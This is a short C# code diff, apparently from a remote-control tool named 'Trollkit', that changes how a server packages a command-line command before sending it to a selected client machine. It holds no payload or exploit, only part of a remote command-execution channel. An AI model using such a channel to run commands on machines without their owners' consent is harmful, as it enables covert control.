@@ -50,7 +50,7 @@ namespace Trollkit_Library.ViewModels.Commands
 		/// </summary>
         private void SendCMDCommand()
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "ExecuteCMD", Handler = "CMD", Value = CommandText};
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = handler, Value = CommandText};
              _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
         }
 
